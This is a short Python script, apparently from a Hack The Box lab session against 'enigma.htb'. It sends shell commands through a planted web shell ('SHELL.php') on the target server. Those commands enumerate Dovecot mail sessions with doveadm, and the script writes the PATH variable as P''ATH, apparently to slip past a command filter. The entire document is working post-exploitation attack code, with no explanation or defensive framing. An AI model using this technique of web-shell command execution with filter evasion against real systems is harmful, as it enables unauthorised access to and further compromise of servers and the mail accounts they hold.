import urllib.request, urllib.parse

# Just who
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "export P''ATH=/usr/bin:/usr/sbin; /usr/bin/doveadm who 2>&1; echo E1; /usr/bin/doveadm help 2>&1 | head -20; echo E2"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:2000])
except Exception as e:
    print(f"Error: {e}")
